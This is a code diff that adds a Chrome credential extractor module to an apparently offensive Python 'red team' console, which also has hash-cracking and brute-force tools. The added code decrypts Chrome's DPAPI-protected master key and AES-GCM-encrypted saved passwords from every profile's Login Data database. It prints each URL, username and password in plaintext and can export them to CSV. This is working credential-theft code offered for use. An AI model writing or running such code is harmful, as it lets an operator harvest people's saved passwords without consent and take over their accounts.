@@ -16,12 +16,26 @@ import json
 import os
 import subprocess
 import re
+import csv
+import sqlite3
+import shutil
+import tempfile
 from datetime import datetime
 from collections import defaultdict
 import base64
 import urllib.parse
 import cmd
 import shlex
+
+try:
+    import win32crypt
+except ImportError:
+    win32crypt = None
+
+try:
+    from Cryptodome.Cipher import AES
+except ImportError:
+    AES = None
 
 class Colors:
     HEADER = '\033[95m'
@@ -299,6 +313,172 @@ class HashCracker:
         print(f"{Colors.RED}[-]{Colors.END} Hash not cracked")
         return None
 
+class BrowserCredentialExtractor:
+    """Extract saved Google Chrome credentials on Windows."""
+
+    PROFILE_PATTERN = re.compile(r"^(Default|Profile \d+)$")
+
+    @staticmethod
+    def default_user_data_dir():
+        user_profile = os.environ.get('USERPROFILE', '')
+        if not user_profile:
+            return ''
+        return os.path.normpath(
+            os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
+        )
+
+    @classmethod
+    def local_state_path(cls, user_data_dir=None):
+        base_dir = user_data_dir or cls.default_user_data_dir()
+        if not base_dir:
+            return ''
+        return os.path.join(base_dir, 'Local State')
+
+    @staticmethod
+    def validate_environment():
+        if sys.platform != 'win32':
+            raise RuntimeError("Chrome credential extraction is only supported on Windows hosts")
+        if win32crypt is None:
+            raise RuntimeError("Missing dependency: pywin32 (win32crypt)")
+        if AES is None:
+            raise RuntimeError("Missing dependency: pycryptodomex (Cryptodome)")
+
+    @classmethod
+    def get_secret_key(cls, user_data_dir=None):
+        cls.validate_environment()
+        local_state_path = cls.local_state_path(user_data_dir)
+        if not local_state_path or not os.path.exists(local_state_path):
+            raise FileNotFoundError(f"Chrome Local State file not found: {local_state_path}")
+
+        with open(local_state_path, 'r', encoding='utf-8') as handle:
+            local_state = json.load(handle)
+
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        if encrypted_key.startswith(b'DPAPI'):
+            encrypted_key = encrypted_key[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+    @classmethod
+    def list_profiles(cls, user_data_dir=None):
+        base_dir = user_data_dir or cls.default_user_data_dir()
+        if not base_dir or not os.path.isdir(base_dir):
+            raise FileNotFoundError(f"Chrome user data directory not found: {base_dir}")
+
+        profiles = []
+        for entry in os.listdir(base_dir):
+            full_path = os.path.join(base_dir, entry)
+            if os.path.isdir(full_path) and cls.PROFILE_PATTERN.match(entry):
+                profiles.append(entry)
+
+        return sorted(profiles, key=lambda name: (name != 'Default', name))
+
+    @staticmethod
+    def decrypt_password(ciphertext, secret_key):
+        if isinstance(ciphertext, memoryview):
+            ciphertext = ciphertext.tobytes()
+
+        if not ciphertext:
+            return ''
+
+        if ciphertext[:3] in (b'v10', b'v11'):
+            initialisation_vector = ciphertext[3:15]
+            encrypted_password = ciphertext[15:-16]
+            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
+            return cipher.decrypt(encrypted_password).decode('utf-8', errors='ignore')
+
+        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode(
+            'utf-8',
+            errors='ignore',
+        )
+
+    @staticmethod
+    def open_login_db(login_db_path):
+        if not os.path.exists(login_db_path):
+            raise FileNotFoundError(f"Chrome login database not found: {login_db_path}")
+
+        temp_handle = tempfile.NamedTemporaryFile(prefix='Loginvault_', suffix='.db', delete=False)
+        temp_handle.close()
+        shutil.copy2(login_db_path, temp_handle.name)
+        return sqlite3.connect(temp_handle.name), temp_handle.name
+
+    @staticmethod
+    def export_to_csv(credentials, output_csv):
+        with open(output_csv, mode='w', newline='', encoding='utf-8') as handle:
+            writer = csv.writer(handle)
+            writer.writerow(['index', 'browser', 'profile', 'url', 'username', 'password'])
+            for index, item in enumerate(credentials, 1):
+                writer.writerow([
+                    index,
+                    item['browser'],
+                    item['profile'],
+                    item['url'],
+                    item['username'],
+                    item['password'],
+                ])
+
+    @classmethod
+    def extract_credentials(cls, user_data_dir=None, output_csv=None):
+        cls.validate_environment()
+        user_data_dir = user_data_dir or cls.default_user_data_dir()
+        secret_key = cls.get_secret_key(user_data_dir)
+        profiles = cls.list_profiles(user_data_dir)
+
+        if not profiles:
+            print(f"{Colors.YELLOW}[*]{Colors.END} No Chrome profiles found in {user_data_dir}")
+            return []
+
+        credentials = []
+        print(f"\n{Colors.BLUE}[*]{Colors.END} Chrome credential extraction")
+        print(f"{Colors.BLUE}[*]{Colors.END} User data directory: {user_data_dir}")
+
+        for profile in profiles:
+            login_db_path = os.path.join(user_data_dir, profile, 'Login Data')
+            if not os.path.exists(login_db_path):
+                print(f"{Colors.YELLOW}[*]{Colors.END} Skipping {profile}: Login Data not found")
+                continue
+
+            print(f"\n{Colors.BLUE}[*]{Colors.END} Reading profile: {profile}")
+            connection = None
+            temp_path = None
+            try:
+                connection, temp_path = cls.open_login_db(login_db_path)
+                cursor = connection.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                rows = cursor.fetchall()
+                cursor.close()
+            finally:
+                if connection:
+                    connection.close()
+                if temp_path and os.path.exists(temp_path):
+                    os.remove(temp_path)
+
+            for url, username, ciphertext in rows:
+                if not url or not username or not ciphertext:
+                    continue
+
+                try:
+                    password = cls.decrypt_password(ciphertext, secret_key)
+                except Exception as exc:
+                    print(f"{Colors.RED}[-]{Colors.END} Failed to decrypt entry for {url}: {exc}")
+                    continue
+
+                record = {
+                    'browser': 'chrome',
+                    'profile': profile,
+                    'url': url,
+                    'username': username,
+                    'password': password,
+                }
+                credentials.append(record)
+                print(f"{Colors.GREEN}[+]{Colors.END} {profile} | {url} | {username} | {password}")
+
+        if output_csv:
+            cls.export_to_csv(credentials, output_csv)
+            print(f"\n{Colors.GREEN}[+]{Colors.END} Credentials exported to {output_csv}")
+
+        print(f"\n{Colors.GREEN}[+]{Colors.END} Extracted {len(credentials)} credential(s)")
+        return credentials
+
 class BruteForceAuth:
     """Brute force authentication tester"""
     
@@ -552,6 +732,15 @@ class RedTeamConsole(cmd.Cmd):
                 },
                 'class': HashCracker
             },
+            'password/browser_creds': {
+                'name': 'Chrome Credential Extractor',
+                'description': 'Extract saved Chrome credentials from local profiles',
+                'options': {
+                    'USER_DATA_DIR': {'required': False, 'default': BrowserCredentialExtractor.default_user_data_dir(), 'description': 'Chrome User Data directory'},
+                    'OUTPUT_CSV': {'required': False, 'default': '', 'description': 'Optional CSV export path'},
+                },
+                'class': BrowserCredentialExtractor
+            },
             'system/proc_mon': {
                 'name': 'Process Monitor',
                 'description': 'List running processes',
@@ -729,6 +918,11 @@ class RedTeamConsole(cmd.Cmd):
                 algorithm = self.module_options['ALGORITHM']
                 wordlist = self.module_options['WORDLIST'].split(',')
                 HashCracker.crack_hash(target_hash, wordlist, algorithm)
+
+            elif self.current_module == 'password/browser_creds':
+                user_data_dir = self.module_options.get('USER_DATA_DIR') or None
+                output_csv = self.module_options.get('OUTPUT_CSV') or None
+                BrowserCredentialExtractor.extract_credentials(user_data_dir, output_csv)
             
             elif self.current_module == 'system/proc_mon':
                 ProcessMonitor.list_processes()
